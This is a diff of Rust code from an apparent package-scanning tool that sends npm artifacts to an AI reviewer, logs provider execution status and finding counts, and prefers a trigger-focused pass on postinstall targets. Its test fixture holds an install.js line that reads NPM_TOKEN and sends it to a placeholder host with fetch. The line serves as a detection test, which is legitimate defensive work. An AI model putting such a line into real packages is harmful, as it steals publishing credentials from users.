@@ -19,8 +19,9 @@ use std::path::PathBuf;
 use std::time::Duration;
 use whoathere_artifact::Sha256Digest;
 use whoathere_artifact_review_runtime::{
-    hosted_cli_provider_identity_v2, ArtifactAiProviderKindV2, ArtifactAiProviderV2,
-    ArtifactReviewCancellationTokenV2, AuthorizedHostedCliProviderV2, HostedCliRuntimePolicyV2,
+    hosted_cli_provider_identity_v2, ArtifactAiExecutionStatusV2, ArtifactAiProviderKindV2,
+    ArtifactAiProviderV2, ArtifactReviewCancellationTokenV2, AuthorizedHostedCliProviderV2,
+    HostedCliRuntimePolicyV2,
 };
 use whoathere_detector::{
     artifact_review_adapter_result_schema_sha256_v2, artifact_review_prompt_template_sha256_v2,
@@ -150,10 +151,10 @@ impl ExactArtifactAiAdapterV1 for ExactArtifactCodexAiAdapterV1 {
         .map_err(|error| OptionalAdapterErrorV1::new(error.reason_code()))?;
         let cancellation = ArtifactReviewCancellationTokenV2::new();
         let specialist_pass = preferred_specialist_pass(deterministic);
-        let selected_work_item = select_mvp_work_item(&review_request, specialist_pass)
-            .ok_or_else(|| {
-                OptionalAdapterErrorV1::new("exact_artifact_codex_no_reviewable_content")
-            })?;
+        let selected_work_item =
+            select_mvp_work_item(&review_request, deterministic, specialist_pass).ok_or_else(
+                || OptionalAdapterErrorV1::new("exact_artifact_codex_no_reviewable_content"),
+            )?;
         let outcome = authorization
             .invoke(
                 &review_request,
@@ -167,6 +168,11 @@ impl ExactArtifactAiAdapterV1 for ExactArtifactCodexAiAdapterV1 {
             .receipt()
             .receipt_sha256()
             .map_err(|error| OptionalAdapterErrorV1::new(error.reason_code()))?;
+        let provider_status = outcome.receipt().status();
+        let provider_elapsed_millis = outcome.receipt().elapsed_millis();
+        let provider_stdout_byte_len = outcome.receipt().raw_stdout_byte_len();
+        let provider_stderr_byte_len = outcome.receipt().raw_stderr_byte_len();
+        let provider_model_output_byte_len = outcome.receipt().model_output_byte_len();
         let output = outcome.into_parts().0;
         let normalization = normalize_artifact_review_provider_outputs_v2(
             prepared.evidence_subject(),
@@ -181,13 +187,49 @@ impl ExactArtifactAiAdapterV1 for ExactArtifactCodexAiAdapterV1 {
         let mut reasons = vec![
             "exact_artifact_codex_coverage_incomplete".to_string(),
             "exact_artifact_codex_hosted_provider_opaque".to_string(),
-            "exact_artifact_codex_mvp_single_work_item".to_string(),
+            "exact_artifact_codex_trigger_target_single_work_item".to_string(),
             "exact_artifact_codex_no_admission_authority".to_string(),
+            format!(
+                "exact_artifact_codex_provider_status:{}",
+                provider_execution_status_reason(provider_status)
+            ),
+            format!("exact_artifact_codex_provider_elapsed_millis:{provider_elapsed_millis}"),
+            format!("exact_artifact_codex_provider_stdout_byte_len:{provider_stdout_byte_len}"),
+            format!("exact_artifact_codex_provider_stderr_byte_len:{provider_stderr_byte_len}"),
+            format!(
+                "exact_artifact_codex_provider_model_output_byte_len:{}",
+                provider_model_output_byte_len.unwrap_or(0)
+            ),
             format!(
                 "exact_artifact_codex_receipt_sha256:{}",
                 receipt_sha256.as_str().trim_start_matches("sha256:")
             ),
         ];
+        for outcome in normalization.outcomes() {
+            reasons.push(outcome.status().reason_code().to_string());
+            reasons.push(format!(
+                "exact_artifact_codex_declared_finding_count:{}",
+                outcome.declared_finding_count()
+            ));
+            reasons.push(format!(
+                "exact_artifact_codex_structurally_valid_finding_count:{}",
+                outcome.structurally_valid_finding_count()
+            ));
+            reasons.push(format!(
+                "exact_artifact_codex_retained_finding_count:{}",
+                outcome.retained_finding_count()
+            ));
+            reasons.push(format!(
+                "exact_artifact_codex_rejected_finding_count:{}",
+                outcome.rejected_finding_count()
+            ));
+            reasons.extend(
+                outcome
+                    .rejection_reasons()
+                    .iter()
+                    .map(|reason| reason.reason_code().to_string()),
+            );
+        }
         for finding in result.findings() {
             reasons.push(format!(
                 "exact_artifact_codex_threat_class:{}",
@@ -375,6 +417,14 @@ impl ExactArtifactBehaviorObserverV1 for ExactArtifactCodexAiAdapterV1 {
 }
 
 fn preferred_specialist_pass(analysis: &ArtifactStaticAnalysis) -> ArtifactReviewPassV2 {
+    if analysis
+        .trigger_graph
+        .surfaces
+        .iter()
+        .any(|surface| surface.target_file_id.is_some())
+    {
+        return ArtifactReviewPassV2::Trigger;
+    }
     let has_category = |categories: &[ArtifactFindingCategory]| {
         analysis
             .findings
@@ -406,10 +456,39 @@ fn preferred_specialist_pass(analysis: &ArtifactStaticAnalysis) -> ArtifactRevie
     }
 }
 
-fn select_mvp_work_item(
-    request: &ArtifactReviewRequestV2,
+fn select_mvp_work_item<'a>(
+    request: &'a ArtifactReviewRequestV2,
+    analysis: &ArtifactStaticAnalysis,
     specialist_pass: ArtifactReviewPassV2,
-) -> Option<&ArtifactReviewWorkItemV2> {
+) -> Option<&'a ArtifactReviewWorkItemV2> {
+    for target_file_id in analysis
+        .trigger_graph
+        .surfaces
+        .iter()
+        .filter_map(|surface| surface.target_file_id.as_ref())
+    {
+        let Some(file) = request.coverage().files().iter().find(|file| {
+            file.file_id() == target_file_id
+                && executable_source_language(file.language())
+                && file
+                    .contexts()
+                    .iter()
+                    .any(|context| context.kind() == ArtifactReviewContextKindV2::TriggerSurface)
+        }) else {
+            continue;
+        };
+        let Some(first_chunk) = file.chunks().iter().min_by_key(|chunk| chunk.start_byte()) else {
+            continue;
+        };
+        if let Some(item) = request.work_items().iter().find(|item| {
+            item.pass() == specialist_pass
+                && item.file_id() == target_file_id
+                && item.chunk_id() == first_chunk.chunk_id()
+        }) {
+            return Some(item);
+        }
+    }
+
     let trigger_surface_file = |item: &&ArtifactReviewWorkItemV2, executable_only: bool| {
         item.pass() == specialist_pass
             && request.coverage().files().iter().any(|file| {
@@ -448,6 +527,29 @@ fn executable_source_language(language: SourceLanguage) -> bool {
             | SourceLanguage::Shell
             | SourceLanguage::Pth
     )
+}
+
+fn provider_execution_status_reason(status: ArtifactAiExecutionStatusV2) -> &'static str {
+    match status {
+        ArtifactAiExecutionStatusV2::Completed => "completed",
+        ArtifactAiExecutionStatusV2::ClientNonZeroExit => "client_non_zero_exit",
+        ArtifactAiExecutionStatusV2::TimedOut => "timed_out",
+        ArtifactAiExecutionStatusV2::Cancelled => "cancelled",
+        ArtifactAiExecutionStatusV2::StdoutLimitExceeded => "stdout_limit_exceeded",
+        ArtifactAiExecutionStatusV2::StderrLimitExceeded => "stderr_limit_exceeded",
+        ArtifactAiExecutionStatusV2::OutputCaptureIncomplete => "output_capture_incomplete",
+        ArtifactAiExecutionStatusV2::ProcessCleanupFailed => "process_cleanup_failed",
+        ArtifactAiExecutionStatusV2::OutputEnvelopeInvalid => "output_envelope_invalid",
+        ArtifactAiExecutionStatusV2::ClientIdentityChanged => "client_identity_changed",
+        ArtifactAiExecutionStatusV2::IsolationCheckFailed => "isolation_check_failed",
+        ArtifactAiExecutionStatusV2::AuthenticationContinuityFailed => {
+            "authentication_continuity_failed"
+        }
+        ArtifactAiExecutionStatusV2::ObservedModelMismatch => "observed_model_mismatch",
+        ArtifactAiExecutionStatusV2::PostExecutionVerificationFailed => {
+            "post_execution_verification_failed"
+        }
+    }
 }
 
 fn optional_result(
@@ -621,7 +723,7 @@ mod tests {
     }
 
     #[test]
-    fn mvp_selection_uses_credential_specialist_on_postinstall_javascript() {
+    fn mvp_selection_uses_full_trigger_review_on_direct_postinstall_target() {
         let bytes = npm_tarball(&[
             (
                 "package/package.json",
@@ -629,7 +731,11 @@ mod tests {
             ),
             (
                 "package/install.js",
-                b"const token = process.env.NPM_TOKEN; fetch('https://example.invalid/' + token);\n",
+                b"require('./decoy.js'); const token = process.env.NPM_TOKEN; fetch('https://example.invalid/' + token);\n",
+            ),
+            (
+                "package/decoy.js",
+                b"const value = process.env.HOME; console.log(value);\n",
             ),
         ]);
         let envelope = ArtifactEnvelope::from_original_bytes(
@@ -706,16 +812,27 @@ mod tests {
             finding.category == ArtifactFindingCategory::CredentialExfiltrationCapability
         }));
         let specialist_pass = preferred_specialist_pass(&analysis);
-        assert_eq!(specialist_pass, ArtifactReviewPassV2::CredentialFilesystem);
-        let selected = select_mvp_work_item(&request, specialist_pass).expect("selected work item");
-        let selected_language = request
+        assert_eq!(specialist_pass, ArtifactReviewPassV2::Trigger);
+        let selected =
+            select_mvp_work_item(&request, &analysis, specialist_pass).expect("selected work item");
+        let selected_file = request
             .coverage()
             .files()
             .iter()
             .find(|file| file.file_id() == selected.file_id())
-            .map(|file| file.language())
             .expect("selected file coverage");
-        assert_eq!(selected.pass(), ArtifactReviewPassV2::CredentialFilesystem);
-        assert_eq!(selected_language, SourceLanguage::Javascript);
+        let selected_path = artifact
+            .file(selected.file_id())
+            .map(|file| file.normalized_path.as_str())
+            .expect("selected file coverage");
+        let selected_chunk = selected_file
+            .chunks()
+            .iter()
+            .find(|chunk| chunk.chunk_id() == selected.chunk_id())
+            .expect("selected physical chunk");
+        assert_eq!(selected.pass(), ArtifactReviewPassV2::Trigger);
+        assert_eq!(selected_file.language(), SourceLanguage::Javascript);
+        assert_eq!(selected_path, "install.js");
+        assert_eq!(selected_chunk.start_byte(), 0);
     }
 }
